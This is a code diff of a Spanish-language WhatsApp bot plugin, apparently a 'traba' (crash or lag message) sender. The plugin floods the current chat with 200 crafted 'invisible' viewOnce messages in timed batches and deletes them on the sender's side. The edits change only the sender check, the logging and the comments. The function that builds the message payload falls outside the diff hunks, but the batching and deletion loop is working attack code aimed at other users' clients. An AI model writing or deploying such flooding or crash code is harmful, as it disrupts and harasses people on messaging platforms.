@@ -1,15 +1,14 @@
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
 let handler = async (m, { conn }) => {
-  // Logs para depurar en consola
-  console.log('m.sender:', m.sender);
-  console.log('conn.user.id:', conn.user.id);
-
-  // Función para normalizar el jid (sacar número, pasar a minúsculas y quitar espacios)
-  let normalizeJid = jid => jid?.toString()?.trim()?.toLowerCase()?.split('@')[0];
+  // 🔍 Normalizador que elimina @ y : (para comparar solo números)
+  let normalizeJid = jid => jid?.toString()?.trim()?.toLowerCase()?.split('@')[0]?.split(':')[0];
 
   const senderNumber = normalizeJid(m.sender);
   const botNumber = normalizeJid(conn.user.id);
+
+  console.log('🔍 sender:', senderNumber);
+  console.log('🤖 botNumber:', botNumber);
 
   if (senderNumber !== botNumber) {
     return m.reply('❌ Solo el número donde está vinculado el bot puede ejecutar este comando.');
@@ -17,12 +16,12 @@ let handler = async (m, { conn }) => {
 
   const jid = m.chat;
 
-  m.reply('Ejecutando el comando en tandas durante 5 minutos 😼');
+  m.reply('Ejecutando el comando durante 5 minutos 😼');
 
   const mensajesPorTanda = 20;
   const totalMensajes = 200;
   const tandas = totalMensajes / mensajesPorTanda;
-  const intervaloTanda = 30000; // 30 segundos entre cada tanda
+  const intervaloTanda = 30000; // 30 segundos entre tandas
 
   for (let i = 0; i < tandas; i++) {
     setTimeout(() => {
@@ -34,12 +33,12 @@ let handler = async (m, { conn }) => {
 handler.command = /^ñoño$/i;
 export default handler;
 
-// Función para pausar (delay)
+// ⏱️ Delay entre mensajes
 function delay(ms) {
   return new Promise(res => setTimeout(res, ms));
 }
 
-// Función que envía el mensaje invisible (tu función original)
+// 🐉 Función que envía el mensaje viewOnce
 async function isagivisble1(target, mention) {
   const generateMessage = {
     viewOnceMessage: {
@@ -102,17 +101,17 @@ async function isagivisble1(target, mention) {
   return msg;
 }
 
-// Función que envía una tanda de 20 mensajes
+// 📦 Envía una tanda de 20 mensajes y los elimina localmente
 async function enviarTandaIsagi(conn, jid, num, m) {
   try {
     for (let i = 0; i < 20; i++) {
       const msg = await isagivisble1(jid, false);
-      await delay(1000); // Espera 1 segundo entre mensajes
+      await delay(1000); // 1 segundo entre mensajes
       await conn.sendMessage(conn.user.id, { delete: msg.key });
     }
 
     await conn.sendMessage(m.chat, {
-      text: `🐢 traba ${num}/10 enviada correctamente.`,
+      text: `✅ Traba ${num}/10 enviada correctamente.`,
     }, { quoted: m });
 
   } catch (e) {
